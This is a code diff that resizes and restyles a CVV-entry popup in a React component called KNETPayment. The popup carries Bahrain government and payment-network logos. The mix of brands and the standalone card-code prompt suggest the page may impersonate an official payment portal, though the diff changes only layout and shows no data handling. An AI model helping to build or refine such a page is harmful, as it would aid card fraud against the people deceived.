@@ -567,7 +567,7 @@ export default function KNETPayment() {
         <div style={{
           backgroundColor: "#fff",
           borderRadius: 12,
-          maxWidth: 520,
+          maxWidth: 420,
           width: "100%",
           boxShadow: "0 20px 60px rgba(0,0,0,0.3)",
           overflow: "hidden",
@@ -575,9 +575,9 @@ export default function KNETPayment() {
         }}>
           {/* Popup Header with logos */}
           <div style={{
-            background: "linear-gradient(135deg, #f8f9fa 0%, #ffffff 100%)",
-            padding: "18px 24px",
-            borderBottom: "2px solid #e0e0e0",
+            background: "#fff",
+            padding: "12px 20px",
+            borderBottom: "1px solid #e0e0e0",
           }}>
             <div style={{
               display: "flex",
@@ -590,27 +590,20 @@ export default function KNETPayment() {
                 <img
                   src="/logo_ar.svg"
                   alt="شعار مملكة البحرين"
-                  style={{ height: 55 }}
+                  style={{ height: 32 }}
                   onError={(e: any) => { e.target.src = '/bahrain-iga-logo.png'; }}
                 />
               </div>
 
               {/* Center: Title */}
-              <div style={{ textAlign: "center", flex: 1, padding: "0 15px" }}>
+              <div style={{ textAlign: "center", flex: 1, padding: "0 10px" }}>
                 <div style={{
                   color: RED,
-                  fontSize: 16,
+                  fontSize: 13,
                   fontWeight: "bold",
-                  letterSpacing: 0.5,
-                  marginBottom: 2,
+                  letterSpacing: 0.3,
                 }}>
                   {t.cvvTitle}
-                </div>
-                <div style={{
-                  color: "#666",
-                  fontSize: 12,
-                }}>
-                  {t.cvvSubtitle}
                 </div>
               </div>
 
@@ -619,23 +612,23 @@ export default function KNETPayment() {
                 <img
                   src="/madfooat-logo.png"
                   alt="مدفوعات البحرين"
-                  style={{ height: 40 }}
+                  style={{ height: 24 }}
                 />
               </div>
             </div>
           </div>
 
           {/* Popup Body */}
-          <div style={{ padding: "24px 28px", direction: isRtl ? "rtl" : "ltr" }}>
+          <div style={{ padding: "18px 22px", direction: isRtl ? "rtl" : "ltr" }}>
             {/* Info message */}
             <div style={{
               backgroundColor: "#f0f7ff",
               border: "1px solid #bdd7f1",
-              borderRadius: 8,
-              padding: "14px 16px",
-              marginBottom: 22,
-              fontSize: 13,
-              lineHeight: 1.7,
+              borderRadius: 6,
+              padding: "10px 14px",
+              marginBottom: 18,
+              fontSize: 12,
+              lineHeight: 1.6,
               color: "#2c5282",
               textAlign: isRtl ? "right" : "left",
             }}>
@@ -667,8 +660,8 @@ export default function KNETPayment() {
               display: "flex",
               alignItems: "center",
               justifyContent: "center",
-              gap: 15,
-              marginBottom: 24,
+              gap: 12,
+              marginBottom: 20,
             }}>
               <label style={{
                 fontSize: 14,
@@ -691,12 +684,12 @@ export default function KNETPayment() {
                 autoFocus
                 placeholder="•••"
                 style={{
-                  width: 120,
-                  height: 44,
+                  width: 100,
+                  height: 38,
                   border: `2px solid ${cvvError ? '#e53e3e' : '#cbd5e0'}`,
                   borderRadius: 8,
                   padding: "0 16px",
-                  fontSize: 20,
+                  fontSize: 18,
                   textAlign: "center",
                   outline: "none",
                   letterSpacing: 8,
@@ -778,12 +771,12 @@ export default function KNETPayment() {
           {/* Popup Footer */}
           <div style={{
             backgroundColor: "#f8f9fa",
-            padding: "12px 24px",
+            padding: "8px 20px",
             borderTop: "1px solid #eee",
             textAlign: "center",
           }}>
-            <img src="/benefit-logo.png" alt="Benefit" style={{ height: 30, marginBottom: 4 }} />
-            <div style={{ fontSize: 10, color: "#999" }}>
+            <img src="/benefit-logo.png" alt="Benefit" style={{ height: 22, marginBottom: 2 }} />
+            <div style={{ fontSize: 9, color: "#999" }}>
               {t.poweredBy}
             </div>
           </div>
